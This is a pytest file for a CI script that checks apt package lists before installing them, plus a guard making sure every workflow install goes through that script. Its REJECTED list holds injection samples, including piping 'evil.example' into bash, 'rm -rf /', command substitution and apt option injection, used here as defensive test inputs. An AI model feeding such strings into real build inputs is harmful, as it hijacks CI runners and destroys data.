"""Tests for .github/scripts/install_apt_packages.py, and the guard that every
caller-supplied package list reaches apt-get through it (FND-4908).

Before FND-4908 the same list could be declared three ways (``apt-packages``,
``apt_packages``, ``system_deps``) plus ``.github/ci-system-deps.txt``, at nine
install sites; six carried a copied ``grep`` allowlist and three installed the
value unchecked. The check now lives in one script, executed here, and
``test_every_apt_get_install_goes_through_the_script`` fails on any new
``apt-get install`` that bypasses it.
"""

from __future__ import annotations

import re
import subprocess
import sys
from collections.abc import Sequence
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import install_apt_packages  # noqa: E402
from install_apt_packages import (  # noqa: E402
    InvalidPackages,
    commands,
    main,
    parse_packages,
)

REPO_ROOT = Path(__file__).resolve().parents[3]


class Recorder:
    """Stands in for subprocess: records each command, returns set codes."""

    def __init__(self, codes: Sequence[int] = ()) -> None:
        self.calls: list[list[str]] = []
        self._codes = list(codes)

    def __call__(self, argv: Sequence[str]) -> int:
        self.calls.append(list(argv))
        return self._codes.pop(0) if self._codes else 0


# Real package lists the fleet needs, including the C++/versioned names whose
# `+` and `.` must not be rejected, and the multi-line and trailing-newline
# shapes a YAML block scalar or the bootstrap's file produce.
ACCEPTED = [
    ("libkrb5-dev", ["libkrb5-dev"]),
    ("libkrb5-dev gcc python3-dev", ["libkrb5-dev", "gcc", "python3-dev"]),
    ("g++ libstdc++6 python3.11-dev", ["g++", "libstdc++6", "python3.11-dev"]),
    ("libkrb5-dev\nlibssl-dev\n", ["libkrb5-dev", "libssl-dev"]),
    ("  libkrb5-dev\tpkg-config ", ["libkrb5-dev", "pkg-config"]),
]

# One entry per rejected class, not one per exploit string.
REJECTED = [
    "libkrb5-dev; curl evil.example/sh | bash",  # command separator
    "libkrb5-dev && rm -rf /",  # command chaining
    "libkrb5-dev $(id)",  # substitution syntax
    "libkrb5-dev `id`",  # backtick syntax
    "*",  # glob
    "lib*",  # glob suffix
    "-y",  # apt flag
    "-o APT::Get::AllowUnauthenticated=true",  # apt option injection
    "./evil.deb",  # local package path
    "libkrb5-dev\n; curl evil.example | bash",  # multi-line bypass
    "libkrb5-dev:amd64",  # arch-qualified
    "libkrb5-dev=1.2.3",  # version pin
    "libkrb5-dev/bookworm",  # release
    "LibKrb5-Dev",  # not a legal Debian name
    "lib_krb5",  # underscore is not legal
    "libkrb5-dev # headers",  # a comment is not a package
]


@pytest.mark.parametrize(("value", "expected"), ACCEPTED)
def test_accepts_real_package_lists(value: str, expected: list[str]) -> None:
    assert parse_packages(value) == expected


@pytest.mark.parametrize("value", REJECTED)
def test_rejects_anything_that_is_not_a_package_name(value: str) -> None:
    with pytest.raises(InvalidPackages):
        parse_packages(value)


@pytest.mark.parametrize("value", ["", "   ", "\n"])
def test_rejects_an_empty_list(value: str) -> None:
    """The calling step's `if:` skips an empty value; reaching here empty
    means the gate and the value disagree, and `apt-get install` with no
    arguments must never run."""
    with pytest.raises(InvalidPackages):
        parse_packages(value)


def test_installs_as_argv_without_recommends() -> None:
    assert commands(["libkrb5-dev", "gcc"]) == [
        ["sudo", "apt-get", "update", "-qq"],
        [
            "sudo",
            "apt-get",
            "install",
            "-y",
            "--no-install-recommends",
            "libkrb5-dev",
            "gcc",
        ],
    ]


def test_env_source_installs(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("APT_PACKAGES", "libkrb5-dev gcc")
    run = Recorder()
    assert main(["--env", "APT_PACKAGES"], run=run) == 0
    assert run.calls == commands(["libkrb5-dev", "gcc"])


def test_file_source_installs(tmp_path: Path) -> None:
    """The bootstrap writes the file as the flag value plus a newline."""
    deps = tmp_path / "ci-system-deps.txt"
    deps.write_text("libkrb5-dev gcc\n", encoding="utf-8")
    run = Recorder()
    assert main(["--file", str(deps)], run=run) == 0
    assert run.calls == commands(["libkrb5-dev", "gcc"])


def test_rejected_list_installs_nothing(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    monkeypatch.setenv("SYSTEM_DEPS", "libkrb5-dev=1.2 gcc")
    run = Recorder()
    assert main(["--env", "SYSTEM_DEPS"], run=run) == 1
    assert run.calls == [], "nothing may run once the list is rejected"
    err = capsys.readouterr().err
    assert "::error" in err and "$SYSTEM_DEPS" in err and "'libkrb5-dev=1.2'" in err


def test_unset_env_var_is_rejected(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("APT_PACKAGES", raising=False)
    run = Recorder()
    assert main(["--env", "APT_PACKAGES"], run=run) == 1
    assert run.calls == []


def test_missing_file_fails(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    run = Recorder()
    assert main(["--file", str(tmp_path / "absent.txt")], run=run) == 1
    assert run.calls == []
    assert "::error::cannot read" in capsys.readouterr().err


def test_failed_update_stops_before_install(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("APT_PACKAGES", "gcc")
    run = Recorder(codes=[100])
    assert main(["--env", "APT_PACKAGES"], run=run) == 100
    assert run.calls == commands(["gcc"])[:1]


def test_failed_install_fails_the_step(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("APT_PACKAGES", "gcc")
    assert main(["--env", "APT_PACKAGES"], run=Recorder(codes=[0, 100])) == 100


def test_every_apt_call_is_bounded(monkeypatch: pytest.MonkeyPatch) -> None:
    seen: list[float | None] = []

    def fake_run(argv: list[str], *, check: bool, timeout: float | None):
        seen.append(timeout)
        return subprocess.CompletedProcess(argv, 0)

    monkeypatch.setattr(install_apt_packages.subprocess, "run", fake_run)
    assert install_apt_packages._run(["sudo", "apt-get", "update"]) == 0
    assert seen == [install_apt_packages.TIMEOUT_S]


def test_a_stalled_apt_call_fails_the_step(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """A hung mirror or proxy must fail the install, not hold the job until
    the runner's own timeout."""

    def stall(argv: list[str], **_kwargs: object):
        raise subprocess.TimeoutExpired(argv, install_apt_packages.TIMEOUT_S)

    monkeypatch.setattr(install_apt_packages.subprocess, "run", stall)
    monkeypatch.setenv("APT_PACKAGES", "gcc")
    code = main(["--env", "APT_PACKAGES"])
    assert code == install_apt_packages.TIMED_OUT
    assert "did not finish" in capsys.readouterr().err


@pytest.mark.parametrize(
    "argv", [[], ["--env", "A", "--file", "f"]], ids=["no-source", "both"]
)
def test_exactly_one_source(argv: list[str]) -> None:
    with pytest.raises(SystemExit) as exc:
        main(argv, run=Recorder())
    assert exc.value.code == 2


# ---------------------------------------------------------------------------
# Every apt-get install goes through the script.
# ---------------------------------------------------------------------------

# Installs of a fixed package this repo names itself, from a vendor apt repo
# the action sets up. Nothing a caller supplies reaches them.
FIXED_INSTALLS = {
    (".github/actions/twingate-connect/action.yml", "twingate"),
    (".github/actions/globalprotect-connect/action.yml", "openconnect"),
}

# Every site that installs a caller's package list, by file: the input (or
# file) each one reads. These are the nine sites FND-4908 found, less the
# vendored detect action's, which conformance-reusable.yaml now covers.
SCRIPT_CALLS = {
    ".github/workflows/tests-reusable.yaml": ["--env APT_PACKAGES"] * 3,
    ".github/workflows/conformance-reusable.yaml": [
        "--env APT_PACKAGES",
        "--file .github/ci-system-deps.txt",
    ],
    ".github/workflows/build-and-publish-app.yaml": ["--env APT_PACKAGES"] * 2,
    ".github/workflows/checks-reusable.yaml": ["--env SYSTEM_DEPS"],
}

# `apt-get install`, `apt install`, and either with options before `install`.
_APT_INSTALL = re.compile(r"\bapt(?:-get)?\s+(?:-\S+\s+)*install\b")
_SCRIPT_CALL = re.compile(r"install_apt_packages\.py\"?\s+(--(?:env|file)\s+\S+)")


def _ci_files() -> list[Path]:
    roots = [
        REPO_ROOT / ".github" / "workflows",
        REPO_ROOT / ".github" / "actions",
        REPO_ROOT / ".github" / "workflow-templates",
        REPO_ROOT
        / "packages"
        / "conformance"
        / "conformance"
        / "bootstrap"
        / "templates",
    ]
    return sorted(
        path
        for root in roots
        for path in root.rglob("*")
        if path.is_file() and path.suffix in {".yml", ".yaml", ".sh"}
    )


def _code(line: str) -> str:
    """The line without a trailing YAML/shell comment."""
    return line.split(" #", 1)[0] if not line.lstrip().startswith("#") else ""


def _commands(text: str) -> list[str]:
    """Shell commands in *text*, comments dropped and every backslash-continued
    line joined onto the one it continues, so `sudo apt-get \\` followed by
    `install -y "$X"` is scanned as the one command it is."""
    out: list[str] = []
    pending = ""
    for line in text.splitlines():
        code = _code(line).rstrip()
        if code.endswith("\\"):
            pending += code[:-1] + " "
            continue
        out.append(pending + code)
        pending = ""
    if pending:
        out.append(pending)
    return out


def _installs(text: str) -> tuple[list[str], set[str]]:
    """(installs of a variable list, fixed package names installed) in *text*."""
    variable: list[str] = []
    fixed: set[str] = set()
    for command in _commands(text):
        if not _APT_INSTALL.search(command):
            continue
        if "$" in command or "xargs" in command:
            variable.append(command.strip())
            continue
        fixed.update(
            word
            for word in _APT_INSTALL.split(command, 1)[1].split()
            if not word.startswith("-") and re.fullmatch(r"[a-z0-9][a-z0-9+.-]*", word)
        )
    return variable, fixed


@pytest.mark.parametrize(
    "text",
    [
        'sudo apt-get install -y "$APT_PACKAGES"',
        "sudo apt-get install -y \\\n  $APT_PACKAGES",
        'sudo apt-get \\\n  install -y "$APT_PACKAGES"',
        "sudo apt-get -qq \\\n  install \\\n  -y \\\n  ${{ inputs.apt-packages }}",
        "xargs -a .github/ci-system-deps.txt sudo apt-get install -y",
        "sudo apt install -y $SYSTEM_DEPS",
    ],
    ids=["one-line", "list-continued", "verb-continued", "every-word", "xargs", "apt"],
)
def test_the_guard_sees_a_variable_install_in_any_shape(text: str) -> None:
    """The guard reads commands, not physical lines: a continuation must not
    hide a caller's list from it."""
    variable, _ = _installs(text)
    assert variable, text


def test_the_guard_reads_a_continued_fixed_install() -> None:
    variable, fixed = _installs(
        "sudo apt-get install -y \\\n  --no-install-recommends \\\n  twingate"
    )
    assert variable == [] and fixed == {"twingate"}


def test_every_apt_get_install_goes_through_the_script() -> None:
    """A caller's package list reaches apt-get only through
    install_apt_packages.py. Any other `apt-get install` in CI must be one of
    the fixed, repo-named installs above."""
    found: set[tuple[str, str]] = set()
    for path in _ci_files():
        rel = str(path.relative_to(REPO_ROOT))
        variable, fixed = _installs(path.read_text(encoding="utf-8"))
        assert not variable, (
            f"{rel}: {variable} installs a variable list without "
            "install_apt_packages.py"
        )
        found.update((rel, package) for package in fixed)
    assert found == FIXED_INSTALLS, (
        "an `apt-get install` outside install_apt_packages.py: route it "
        "through the script, or, for a fixed package this repo names, add it "
        f"to FIXED_INSTALLS. Found: {sorted(found - FIXED_INSTALLS)}"
    )


def test_every_install_site_calls_the_script() -> None:
    calls = {}
    for path in _ci_files():
        rel = str(path.relative_to(REPO_ROOT))
        found = _SCRIPT_CALL.findall(path.read_text(encoding="utf-8"))
        if found:
            calls[rel] = found
    assert calls == SCRIPT_CALLS
